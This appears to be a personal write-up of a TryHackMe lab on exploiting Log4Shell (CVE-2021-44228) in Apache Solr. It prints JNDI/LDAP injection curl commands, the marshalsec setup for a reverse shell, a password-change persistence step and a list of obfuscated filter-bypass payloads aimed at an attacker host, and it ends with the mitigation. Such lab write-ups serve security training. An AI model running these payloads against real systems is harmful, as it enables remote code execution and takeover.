# Log4j-TryHackMe-Writeups


## 1) Reconnaissance:

1)  What service is running on port 8983? (Just the name of the software)?

Portscanning the instance with -p- and -sV which shows Apache Solr service runs on port 8893.

<img width="782" height="215" alt="567306506-f03bfdb0-5fba-488b-9e46-ee5d1ba54c9a" src="https://github.com/user-attachments/assets/2eea7c85-8051-4c56-92f9-be0a9e14f4b7" />

Answer: Apache Solr



## 2) Discovery:

1)  Take a close look at the first page visible when navigating to http://MACHINE_IP:8983 (opens in new tab). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?


Solution:


<img width="903" height="827" alt="Screenshot 2026-03-22 124658" src="https://github.com/user-attachments/assets/366cbf9a-43de-422b-bdf6-af3f9b1c14b0" />


Dsolr.log.dir is stored at /var/solr/logs



2)  One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)


Answer:solr.log



3)  What "path" or URL endpoint is indicated in these repeated entries?


Solution:


<img width="1699" height="202" alt="Screenshot 2026-03-22 125609" src="https://github.com/user-attachments/assets/df0837c9-bb74-4e0d-b5f4-2afb8f071dc5" />



The path /admin/cores is repeated multiple times in the log file.


4)  Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)


Solution:


The field name that indicates some data entrypoint that you as a user could control is params.

Answer:params


## 3) Proof of Concept:


Command:  nc -lnvp 9999


<img width="525" height="176" alt="567415706-b520fa08-92b7-4908-89d5-1dd7b255af66" src="https://github.com/user-attachments/assets/bba13e15-5b68-404c-81a6-1fc5c0154bfb" />

Then connected usering curl in the /solr/admin/cores?foo= endpoint with my local ip with ldap lookup.



<img width="814" height="209" alt="567416004-b0fa8239-ca6e-401b-85e8-769fa3523ad0" src="https://github.com/user-attachments/assets/123d90ec-e867-4a37-817b-3f89d7f53113" />


Command:  curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:9999\}'


## 4)  Exploitation:


To retrieve the marshalsec utility referenced previously. If you're on the AttackBox, navigate to /root/Rooms/solar/marshalsec


In the netcat response we can see that the returned data is not readable its because, we didn't use a LDAP server to communicate to the target we need a LDAP server


For that we can use marshalsec tool

Github repo: https://github.com/mbechler/marshalsec

For building the marshalsec tool we need maven tool

Use commands as follows : 

 `sudo apt install maven`

 `mvn clean package -DskipTests`

 Also host a local python http server by using this command

`python3 -m http.server`


## Hosting the LDAP Server:

Command:



java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.49.122.225:8000/#Exploit"




<img width="1866" height="329" alt="Screenshot 2026-03-22 230923" src="https://github.com/user-attachments/assets/73df96d9-b71a-435c-9ca4-75bd002d8ce5" />





<img width="1574" height="118" alt="Screenshot 2026-03-22 231300" src="https://github.com/user-attachments/assets/6724131c-d9dc-48df-8cd6-f8bfe84cbea8" />



## Crafting our Exploit:



<img width="889" height="235" alt="567418570-ba3a1901-58e5-4f60-b7e3-7552e1a9fd31" src="https://github.com/user-attachments/assets/cb5478c8-7da4-402f-8825-49f387aa193e" />


Execute the java file using this command which generates the class file.

`javac Exploit.java -source 8 -target 8`

Then python3 server should we running in the same place of the Exploit is there



<img width="823" height="311" alt="567419124-db69c335-1778-4ed5-9e9d-3284353de9fd" src="https://github.com/user-attachments/assets/57d82128-4938-491f-b5cb-047262b25d7f" />



And open a ncat listenert in port 9999


Command:

curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:1389/Exploit\}'



<img width="954" height="280" alt="567419458-acc63de3-fd33-4959-b428-ec1daa435b84" src="https://github.com/user-attachments/assets/a447bc9e-d40d-498f-a20c-594dbed723fa" />


And getting revshell



<img width="673" height="196" alt="567419479-7883198c-0a68-43cb-8621-cb9eae923774" src="https://github.com/user-attachments/assets/88a7403e-ca1c-4f83-9d3e-1c7fd85217be" />




## 5) Persistence:


Command:

python3 -c "import pty; pty.spawn('/bin/bash')"



<img width="663" height="165" alt="567419721-fb0bc3b2-d295-438a-b21b-364922e73000" src="https://github.com/user-attachments/assets/532f4672-7149-4f76-b29e-21d8097836be" />



Listing sudo permissions by

`sudo -l`


<img width="961" height="204" alt="567419914-cf36b68b-21c5-43e4-b747-7b59b832a929" src="https://github.com/user-attachments/assets/0ff0d682-19d4-4c89-bebe-09f0c3498cab" />



Changing the password of the machine : 



<img width="636" height="203" alt="567420008-5a1e1919-561f-4236-abc1-a368a52b71bb" src="https://github.com/user-attachments/assets/fc3c48ac-f3d2-4aeb-867f-c74b4dc880c1" />



Connecting SSH with the changed password

Command:

`ssh solr@10.49.145.26`



<img width="974" height="753" alt="567420130-916df066-d865-490c-b28e-b87028c24c2f" src="https://github.com/user-attachments/assets/ba401df1-71da-4dbd-bf38-ca4d729ec027" />




Successfully completed persistence



<img width="663" height="165" alt="567419717-dc5c5335-7f8c-4a9a-a8a8-d02c91fbf9ef" src="https://github.com/user-attachments/assets/f3cec84c-ca67-4764-b629-d78995e87112" />



## 6) Detection:


We know that the logs are stored in /var/solr/logs



<img width="961" height="460" alt="567420475-9b53d0dd-96ea-468f-9c69-4d00189d9915" src="https://github.com/user-attachments/assets/7239be80-53e1-4f9a-91e6-fe1451800838" />



## 7) Bypasses:


Bypass techniques to bypass the firewall/filters


`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}`



## 8) Mitigation:


Adding this Line of code in the `/etc/default/solr.in.sh` file patches the vulnerability

`SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"`

Testing that again we get no revshell after executing the attack

And successfully completed the room !!!!!




## PROOF :

https://tryhackme.com/room/solar?utm_campaign=social_share&utm_medium=social&utm_content=share-completed-room&utm_source=copy&sharerId=6887121430f3a2b08b6f3547




![Uploading 567421445-c61743a7-cd12-4c39-b441-ad7d3a139dc4.png…]()


















